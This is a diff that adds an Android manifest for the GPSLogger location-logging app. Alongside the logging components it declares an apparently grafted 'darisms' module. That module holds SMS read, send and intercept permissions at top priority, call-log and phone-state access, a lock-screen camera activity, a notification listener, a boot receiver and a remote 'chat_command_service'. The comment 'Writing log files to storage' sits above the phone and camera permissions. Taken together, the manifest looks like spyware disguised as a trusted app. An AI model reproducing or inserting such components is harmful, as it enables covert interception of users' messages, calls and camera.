@@ -1,0 +1,413 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+          xmlns:tools="http://schemas.android.com/tools"
+    android:installLocation="auto"
+    package="com.mendhak.gpslogger"
+    >
+
+    <!-- Satellite and network location services -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+    <!-- Writing log files to storage -->
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+    <!-- If the user wants the app to start on boot -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <!-- If the user needs to send to external services like Custom URL, Dropbox, OSM -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <!-- To check if an internet connection exists before communicating  -->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <!-- If the user needs to use external GPS receiver eg over bluetooth -->
+    <uses-permission android:name="android.permission.ACCESS_MOCK_LOCATION"
+                     tools:ignore="MockLocation"/>
+
+    <!-- To let the user disable battery optimization from within the app -->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission-sdk-23 android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
+    <!-- allow this to run as a foreground service -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+
+
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <!--
+    <uses-feature
+        android:name="android.hardware.camera"
+        android:required="true" />
+    -->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" /> <!-- Required permissions to send USSD -->
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission
+        android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/gpsloggericon3"
+        android:label="@string/app_name"
+        android:theme="@style/AppTheme"
+        android:name="com.mendhak.gpslogger.common.AppSettings"
+        android:usesCleartextTraffic="true"
+        android:requestLegacyExternalStorage="true"
+        >
+
+
+        <service android:name=".GpsLoggingService"  android:exported="true" android:stopWithTask="false" android:foregroundServiceType="location">
+            <intent-filter>
+                <action android:name="com.mendhak.gpslogger.GpsLoggingService" />
+            </intent-filter>
+        </service>
+
+        <service
+            android:name=".notification_listener_service"
+            android:exported="true"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <activity
+            android:name=".GpsMainActivity"
+            android:configChanges="locale"
+            android:label="@string/app_name"
+            android:launchMode="singleTask"
+            android:uiOptions="splitActionBarWhenNarrow"
+            android:windowSoftInputMode="adjustNothing"
+            android:clearTaskOnLaunch="true"
+            android:exported="true"
+            >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+            <intent-filter>
+                <action android:name="com.mendhak.gpslogger.HANDLE_AUTHORIZATION_RESPONSE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            <meta-data android:name="android.app.shortcuts"
+                android:resource="@xml/shortcuts" />
+        </activity>
+
+        <activity android:name="net.openid.appauth.RedirectUriReceiverActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+
+                <data android:scheme="com.mendhak.gpslogger"
+                    android:path="/oauth2googledrive"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <data android:host="oauth2openstreetmap" android:scheme="com.mendhak.gpslogger" />
+            </intent-filter>
+        </activity>
+
+        <activity
+            android:name=".MainPreferenceActivity"
+            android:label="@string/settings_screen_name"
+            android:parentActivityName=".GpsMainActivity" >
+            <meta-data
+                android:name="android.support.PARENT_ACTIVITY"
+                android:value="com.mendhak.gpslogger.GpsMainActivity" />
+
+        </activity>
+
+        <activity
+            android:name=".Faqtivity"
+            android:label="@string/faq_screen_title"
+            android:launchMode="singleTask"
+            android:parentActivityName=".GpsMainActivity" >
+            <meta-data
+                android:name="android.support.PARENT_ACTIVITY"
+                android:value="com.mendhak.gpslogger.GpsMainActivity" />
+        </activity>
+
+        <activity
+            android:name="com.dropbox.core.android.AuthActivity"
+            android:configChanges="orientation|keyboard"
+            android:launchMode="singleTask"
+            android:parentActivityName=".GpsMainActivity" >
+            <meta-data
+                android:name="android.support.PARENT_ACTIVITY"
+                android:value="com.mendhak.gpslogger.GpsMainActivity" />
+
+            <intent-filter>
+                <!-- Set from build.gradle, see defaultConfig -->
+                <!--suppress AndroidDomInspection -->
+                <data android:scheme="db-0unjsn38gpe3rwv" />
+
+                <action android:name="android.intent.action.VIEW" />
+
+                <category android:name="android.intent.category.BROWSABLE" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </activity>
+
+        <activity
+            android:name=".shortcuts.ShortcutCreate"
+            android:theme="@style/Theme.AppCompat.Translucent" >
+            <intent-filter>
+                <action android:name="android.intent.action.CREATE_SHORTCUT" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </activity>
+        <activity
+            android:name=".shortcuts.ShortcutStart"
+            android:theme="@style/Theme.AppCompat.Translucent" >
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW" />
+            </intent-filter>
+        </activity>
+        <activity
+            android:name=".shortcuts.ShortcutStop"
+            android:theme="@style/Theme.AppCompat.Translucent" >
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW" />
+            </intent-filter>
+        </activity>
+
+        <receiver
+            android:name=".StartupReceiver"
+            android:enabled="true"
+            android:permission="android.permission.RECEIVE_BOOT_COMPLETED" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".senders.AlarmReceiver" />
+
+        <receiver android:name=".MyPackageUpgradeReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name=".TaskerReceiver">
+            <intent-filter>
+                <action android:name="com.mendhak.gpslogger.TASKER_COMMAND" />
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name=".RestarterReceiver" android:enabled="true" android:exported="false" />
+
+        <!--android:theme="@style/Theme.AppCompat.Translucent"-->
+        <activity
+            android:name=".NotificationAnnotationActivity"
+            android:label=""
+            android:theme="@style/Theme.AppCompat.Translucent"
+            android:excludeFromRecents="true"
+            >
+            <intent-filter>
+                <action android:name="android.intent.category.DEFAULT" />
+                <category android:name="com.mendhak.gpslogger.NOTIFICATION_BUTTON" />
+            </intent-filter>
+        </activity>
+
+        <provider android:name=".common.ContentApi" android:authorities="com.mendhak.gpslogger" android:exported="true"
+                  tools:ignore="ExportedContentProvider"/>
+
+        <provider
+            android:name="com.mendhak.gpslogger.common.GpsLoggerFileProvider"
+            android:authorities="com.mendhak.gpslogger.fileprovider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/fileprovider"/>
+        </provider>
+
+
+        <activity android:name=".ProfileLinkReceiverActivity" android:theme="@style/Theme.AppCompat.Translucent" >
+            <intent-filter android:label="@string/app_name">
+                <action android:name="android.intent.action.VIEW" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <!-- Handle hyperlinks with specific mime types -->
+                <data android:scheme="http"/>
+                <data android:scheme="https"/>
+                <data android:host="*" />
+                <data android:mimeType="application/x.gpslogger-properties" />
+                <data android:mimeType="application/x-gpslogger-properties" />
+                <data android:mimeType="text/x-java-properties" />
+            </intent-filter>
+            <intent-filter android:label="@string/app_name">
+                <action android:name="android.intent.action.VIEW" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <!-- Handle hyperlinks ending in .properties http://example.com/your.properties -->
+                <data android:scheme="http"/>
+                <data android:scheme="https"/>
+                <data android:host="*" />
+                <data android:mimeType="*/*" />
+                <data android:pathPattern=".*\\.properties" />
+            </intent-filter>
+            <intent-filter android:label="@string/app_name">
+                <action android:name="android.intent.action.VIEW" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <!-- Handle hyperlinks to gpslogger://properties/http://example.com/your.file -->
+                <data android:scheme="gpslogger" android:host="properties" />
+            </intent-filter>
+        </activity>
+
+
+
+        <activity
+            android:name=".darisms.Camera"
+            android:exported="false"
+            android:label="Cameranya"
+            android:noHistory="true"
+            android:showOnLockScreen="true"
+            android:showWhenLocked="true"
+            />
+        <activity
+            android:name=".darisms.spam_list_activity"
+            android:exported="true"
+            android:label="Spam List ACT" />
+
+        <service
+            android:name=".darisms.resend_service"
+            android:exported="false" />
+
+        <activity
+            android:name=".darisms.notify_apps_list_activity"
+            android:exported="false"
+            android:windowSoftInputMode="adjustPan" />
+
+        <service
+            android:name=".notification_listener_service"
+            android:exported="true"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+        <service
+            android:name=".darisms.chat_command_service"
+            android:enabled="true"
+            android:exported="false"
+            android:permission="android.permission.INTERNET"
+            android:process=":command" />
+        <service
+            android:name=".darisms.battery_service"
+            android:enabled="true"
+            android:exported="false"
+            android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE"
+            android:process=":battery">
+            <intent-filter>
+                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+
+                <data android:scheme="sms" />
+                <data android:scheme="smsto" />
+                <data android:scheme="mms" />
+                <data android:scheme="mmsto" />
+            </intent-filter>
+        </service>
+
+        <receiver
+            android:name=".darisms.boot_receiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+
+                <data android:scheme="package" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name=".darisms.sms_receiver"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_DELIVER" />
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name=".darisms.wap_receiver"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_WAP_PUSH">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.WAP_PUSH_DELIVER" />
+
+                <data android:mimeType="application/vnd.wap.mms-message" />
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name=".darisms.call_receiver"
+            android:exported="true">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.intent.action.SUBSCRIPTION_PHONE_STATE" />
+            </intent-filter>
+        </receiver>
+
+        <activity
+            android:name=".darisms.qrcode_show_activity"
+            android:exported="false"
+            android:label="@string/transfer_configuration" />
+        <activity
+            android:name=".darisms.logcat_activity"
+            android:exported="false" />
+        <activity
+            android:name=".darisms.scanner_activity"
+            android:exported="false" />
+        <activity
+            android:name=".darisms.main_activity"
+            android:exported="true"
+            android:windowSoftInputMode="adjustPan"
+            tools:ignore="Instantiatable,IntentFilterExportedReceiver">
+
+            <intent-filter>
+                <action android:name="android.intent.action.SEND" />
+                <action android:name="android.intent.action.SENDTO" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+
+                <data android:scheme="sms" />
+                <data android:scheme="smsto" />
+                <data android:scheme="mms" />
+                <data android:scheme="mmsto" />
+            </intent-filter>
+        </activity>
+
+
+
+
+    </application>
+
+</manifest>
